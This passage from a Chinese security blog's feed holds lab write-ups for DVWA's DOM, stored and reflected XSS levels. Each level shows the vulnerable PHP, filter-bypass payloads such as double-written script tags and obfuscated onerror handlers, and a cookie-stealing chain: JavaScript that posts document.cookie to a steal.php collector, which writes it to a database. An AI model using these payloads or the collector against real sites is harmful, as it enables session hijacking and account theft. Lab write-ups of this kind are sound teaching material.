document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;&quot;+lang+&quot;&apos;&gt;&quot;+decodeURI(lang)+&quot;&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">&lt;input type=&apos;submit&apos; value=&apos;Select&apos;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">setcookie(&apos;security&apos;,&apos;high&apos;,time()+3600);</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&apos;default&apos;,$_GET) &amp;&amp; $_GET[&apos;default&apos;] != NULL)&#123;</span><br><span class="line">$default=$_GET[&apos;default&apos;];</span><br><span class="line">switch($default)&#123;</span><br><span class="line">case &apos;English&apos;:break;</span><br><span class="line">case &apos;French&apos;:break;</span><br><span class="line">case &apos;Spanish&apos;:break;</span><br><span class="line">case &apos;German&apos;:break;</span><br><span class="line">default:header(&quot;location:?default=English&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以看出default值如果不是选项中的四个值，就重定向到选项为English</p><p>跟上一关一样，依然可以采用字符#绕过过滤</p><p>输入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?#default=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(“xss”)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功弹框 </p><p>输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?#default=<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">cookie.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功截取到cookie值 </p>]]></content>
    
    <summary type="html">
    
      dvwa-xss
    
    </summary>
    
      <category term="dvwa-xss" scheme="https://Foxgrin.github.io/categories/dvwa-xss/"/>
    
    
      <category term="xss" scheme="https://Foxgrin.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-xss(stored)</title>
    <link href="https://Foxgrin.github.io//posts/64824/"/>
    <id>https://Foxgrin.github.io//posts/64824/</id>
    <published>2018-07-11T12:47:00.000Z</published>
    <updated>2018-07-11T13:33:57.097Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中的存储型xss关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">setcookie(<span class="string">'security'</span>,<span class="string">'low'</span>,time()+<span class="number">3600</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connection.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'btnSign'</span>]))&#123;</span><br><span class="line">$name=trim($_POST[<span class="string">'txtName'</span>]);</span><br><span class="line">$message=trim($_POST[<span class="string">'mtxMessage'</span>]);</span><br><span class="line">$message=stripslashes($message);</span><br><span class="line">$message=mysql_real_escape_string($message);</span><br><span class="line">$name=mysql_real_escape_string($name);</span><br><span class="line">$sql=<span class="string">"INSERT INTO guestbook (comment,name) VALUES ('$message','$name')"</span>;</span><br><span class="line">$result=mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'btnClear'</span>]))&#123;</span><br><span class="line">$sql=<span class="string">"DELETE FROM guestbook"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT name,comment FROM guestbook"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line"><span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Name:"</span>.$row[<span class="string">'name'</span>].<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Message:"</span>.$row[<span class="string">'comment'</span>].<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从代码可以看出将我们POST的name和message写入数据库，并且原原本本的输出存入数据库的name和message，所以很明显存在xss漏洞，这种属于存储型的xss，先将恶意脚本代码存入数据库中，然后用户每次访问网页时都会执行一次恶意代码 </p><p>我们在name中输入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(“xss”)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-stored/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再次刷新页面依然会跳出提示框 </p><p>那么我们再按反射型xss关卡中的通过存入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">”http://127.0.0.1/demo/xss(reflected)/cookie.js”</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>来跳转到steal.php</p><p>再将cookie值存入数据库的方法试一下 </p><p><img src="/img/dvwa-xss-stored/2.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-stored/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现成功写入cookie值</p><p>但是再次刷新进入页面时，每次都会跳转回steal.php，并写入一次cookie值，这难免会引起用户的怀疑</p><p>这里可以采用ajax技术，即创建一个用javascript代码创建一个XMLHttpRequest对象，这个对象可以在后台与服务器交换数据，就不需要跳转到steal.php了</p><p>脚本如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">"http://127.0.0.1/demo/xss(reflected)/steal.php"</span>;</span><br><span class="line"><span class="keyword">var</span> postStr = <span class="string">"data="</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line"><span class="keyword">var</span> ajax = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">    ajax = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">window</span>.ActiveXObject) &#123;</span><br><span class="line">    ajax = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ajax=<span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">ajax.open(<span class="string">"POST"</span>, url, <span class="literal">true</span>);</span><br><span class="line">ajax.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">ajax.send(postStr);</span><br></pre></td></tr></table></figure><p>然后POST </p><p><img src="/img/dvwa-xss-stored/4.png" alt=""></p><p>每次访问页面都会讲cookie值写入数据库 </p><p><img src="/img/dvwa-xss-stored/5.png" alt=""></p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">setcookie(&apos;security&apos;,&apos;medium&apos;,time()+3600);</span><br><span class="line">include(&quot;../sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;btnSign&apos;]))&#123;</span><br><span class="line">$message=trim($_POST[&apos;mtxMessage&apos;]);</span><br><span class="line">$name=trim($_POST[&apos;txtName&apos;]);</span><br><span class="line">$message=strip_tags($message);</span><br><span class="line">$message=mysql_real_escape_string($message);</span><br><span class="line">$message=htmlspecialchars($message);</span><br><span class="line">$name=mysql_real_escape_string($name);</span><br><span class="line">$name=str_replace(&apos;&lt;script&gt;&apos;,&apos;&apos;,$name);</span><br><span class="line">$sql=&quot;INSERT INTO guestbook(comment,name) VALUES (&apos;$message&apos;,&apos;$name&apos;)&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;btnClear&apos;]))&#123;</span><br><span class="line">$sql=&quot;DELETE FROM guestbook&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT name,comment FROM guestbook&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">while($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">echo &quot;Name:&quot;.$row[&apos;name&apos;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;Message:&quot;.$row[&apos;comment&apos;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以看出这关对message进行了丢弃标签的过滤，而且使用了htmlspecialchars这个函数，这个函数可以使html标签实体化，让标签不再是标签，完全防止了xss注入，所以这关只能在name注入，但是name同时也过滤了script标签，但是没事，跟之前关卡一样，我们可以采用双写绕过过滤 </p><p>在name中输入 </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s&lt;script&gt;cript&gt;alert(‘xss’)&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-stored/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功弹窗</p><p>那么继续思考如何窃取cookie，答案就是双写</p><p>输入</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s&lt;script&gt;cript src=’cookie.js’&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-stored/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功窃取到cookie值 </p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">setcookie(&apos;security&apos;,&apos;high&apos;,time()+3600);</span><br><span class="line">include(&quot;../sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;btnSign&apos;]))&#123;</span><br><span class="line">$message=trim($_POST[&apos;mtxMessage&apos;]);</span><br><span class="line">$name=trim($_POST[&apos;txtName&apos;]);</span><br><span class="line">$message=strip_tags($message);</span><br><span class="line">$message=mysql_real_escape_string($message);</span><br><span class="line">$message=htmlspecialchars($message);</span><br><span class="line">$name=mysql_real_escape_string($name);</span><br><span class="line">$name=preg_replace(&apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;,&apos;&apos;,$name);                                                                                                                                                         </span><br><span class="line">$sql=&quot;INSERT INTO guestbook(comment,name) VALUES (&apos;$message&apos;,&apos;$name&apos;)&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;btnClear&apos;]))&#123;</span><br><span class="line">$sql=&quot;DELETE FROM guestbook&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT name,comment FROM guestbook&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">while($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">echo &quot;Name:&quot;.$row[&apos;name&apos;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;Message:&quot;.$row[&apos;comment&apos;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里对name进行了正则匹配过滤掉了包含按顺序的&lt;,s,c,r,i,p,t字符组成的字符串，所以这里只能通过触发onerror事件来执行js代码</p><p>通过加载图片过程发生异常触发onerror事件</p><p>在name中输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">(alert(‘xss’))</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-stored/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">'var url="http://127.0.0.1/demo/xss(reflected)/steal.php";var postStr="data="+document.cook&amp;#x69;e;var ajax=null;&amp;#x69;f(w&amp;#x69;ndow.XMLHttpRequest)&#123;ajax=new XMLHttpRequest();&#125;else &amp;#x69;f(w&amp;#x69;ndow.Act&amp;#x69;veXObject)&#123;ajax=new Act&amp;#x69;veXObject("M&amp;#x69;crosoft.XMLHTTP");&#125;else&#123;ajax=null;&#125;ajax.open("POST", url, true);ajax.setRequestHeader("Content-Type", "appl&amp;#x69;cat&amp;#x69;on/x-www-form-urlencoded");ajax.send(postStr);'</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将ajax代码执行，将cookie值POST到steal.php</p><p>但在输入之前，我们应该先改一下数据列name的长度，之前设定长度为100，但是我们输入的明显超过了100,在mysql命令行输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table guestbook modify name varchar(500);</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-stored/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功窃取到cookie值 </p>]]></content>
    
    <summary type="html">
    
      dvwa-xss
    
    </summary>
    
      <category term="dvwa-xss" scheme="https://Foxgrin.github.io/categories/dvwa-xss/"/>
    
    
      <category term="xss" scheme="https://Foxgrin.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-xss(reflected)</title>
    <link href="https://Foxgrin.github.io//posts/52787/"/>
    <id>https://Foxgrin.github.io//posts/52787/</id>
    <published>2018-07-11T11:42:00.000Z</published>
    <updated>2018-07-11T13:35:48.318Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中的反射型xss关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">setcookie(&apos;security&apos;,&apos;low&apos;,time()+3600);</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&apos;name&apos;,$_GET) &amp;&amp; $_GET[&apos;name&apos;] != NULL)&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;Hello &apos; . $_GET[ &apos;name&apos; ] . &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>当我们GET一个name值以后，服务器毫无过滤的通过echo输出我们GET的name值，而如果我们输入的是一串代码，则这串代码通过echo就会被执行，这就是反射型的xss漏洞，我们可以通过GET方式输入一串js代码构造一个注入js代码的网页，当受害者访问这个url时，js代码将会自动实现，从而达到恶意攻击目的</p><p>比如我们输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert('xss')</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-reflected/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>于是我们可以利用这个xss漏洞获取服务器的cookie值，然后将cookie值存入数据库</p><p>先创建一个存放cookie的数据库</p><p>在mysql命令行输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">create database dvwacookie;</span><br><span class="line"></span><br><span class="line">use  dvwacookie;</span><br><span class="line"></span><br><span class="line">create table low</span><br><span class="line"></span><br><span class="line">(</span><br><span class="line"></span><br><span class="line">id int primary key,</span><br><span class="line"></span><br><span class="line">cookie varchar(100) </span><br><span class="line"></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>然后在编写一个cookie.js的脚本 </p><p><img src="/img/dvwa-xss-reflected/2.png" alt=""></p><p>这个脚本作用是创建隐藏表单，表单提交到steal.php，提交的内容是cookie值</p><p>接下来编写steal.php，自然就是将提交cookie值写入数据库里了</p><p>steal.php代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$con=mysql_connect(&apos;localhost&apos;,&apos;root&apos;,&apos;root&apos;);</span><br><span class="line">mysql_select_db(&apos;dvwacookie&apos;,$con);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;data&apos;]))&#123;</span><br><span class="line">$sql=&quot;INSERT INTO low(cookie) VALUES (&apos;&quot;.$_POST[&apos;data&apos;].&quot;&apos;)&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后回到存在xss漏洞的网页，通过GET传入name值</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">cookie.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>查看数据库</p><p><img src="/img/dvwa-xss-reflected/4.png" alt=""></p><p>成功获得cookie值 </p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">setcookie(&apos;security&apos;,&apos;medium&apos;,time()+3600);</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&apos;name&apos;,$_GET) &amp;&amp; $_GET[&apos;name&apos;] != NULL)&#123;</span><br><span class="line">$name=str_replace(&apos;&lt;script&gt;&apos;,&apos;&apos;,$_GET[&apos;name&apos;]);</span><br><span class="line">echo &apos;&lt;pre&gt;Hello &apos; . $name . &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>源代码利用了str_replace函数对script标签进行了过滤</p><p>不过没关系，因为函数只执行了一次，所以用双写的方法就可以很轻松的解决</p><p>输入</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s&lt;script&gt;cript&gt;alert('xss')&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-reflected/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>之后跟low关卡一样，输入</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s&lt;script&gt;cript src=cookie.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>获得cookie值 </p><p><img src="/img/dvwa-xss-reflected/6.png" alt=""></p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">setcookie(&apos;security&apos;,&apos;high&apos;,time()+3600);</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&apos;name&apos;,$_GET) &amp;&amp; $_GET[&apos;name&apos;] != NULL)&#123;</span><br><span class="line">$name=preg_replace(&apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;,&apos;&apos;,$_GET[&apos;name&apos;]);</span><br><span class="line">echo &apos;&lt;pre&gt;Hello &apos; . $name . &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这关利用了一个正则匹配过滤函数，i表示大小写，也就是以&lt;开头，以t结尾的字符串，只要中间按顺序包含&lt;script，则会立刻被过滤掉，之前双写绕过过滤的方法在这里行不通</p><p>绕过方法是采用触发onerror事件来执行javascript代码</p><p>onerror事件会在文档或者图像加载过程中发生错误时触发</p><p>例如，我们输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(“xss”)</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-reflected/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>果然，加载图片时发现不存在这个图片发生错误所以触发了onerror事件，然后执行了alert(“xss”)代码 </p><p>那么我们再考虑怎么像之前两关一样获得cookie值</p><p>之前是通过script标签的src属性引用外部的cookie.js文件，将cookie值以POST形式传入steal.php，再将POST的cookie值写入数据库</p><p>但是很明显这关对script标签做了正则过滤，只要我们输入含有这几个字符，都会被过滤掉，所以这里可以用location.href跳转链接到steal.php，将cookie值写入数据库，所以这里只能用GET方式将cookie值传入steal.php</p><p>于是输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">(location.href</span>=<span class="string">”http://127.0.0.1/demo/xss(reflected)/steal.php?data</span>=<span class="string">”+document.cookie)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是结果却是</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-reflected/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>为什么呢</p><p>仔细检查发现我们输入里面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">SrC</span>=<span class="string">#</span> <span class="attr">oneRror</span>=<span class="string">(locatIon.href</span>=<span class="string">”httP://127.0.0.1/demo/xss(reflected)/steal.php?data</span>=<span class="string">”+document.cookie)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>大写字母构成了&lt;script，所以被过滤掉了</p><p>所以我们可以采用先获得cookie值，然后将cookie值传入steal.php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-reflected/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">(alert(document.cookie))</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在将这个cookie值传入steal.php</p><p>还有种方法是对某个关键过滤字符进行html编码，但是我亲测不行，不知道什么原因，还望大神指点原因</p>]]></content>
    
    <summary type="html">
    
      dvwa-xss
    
    </summary>
    
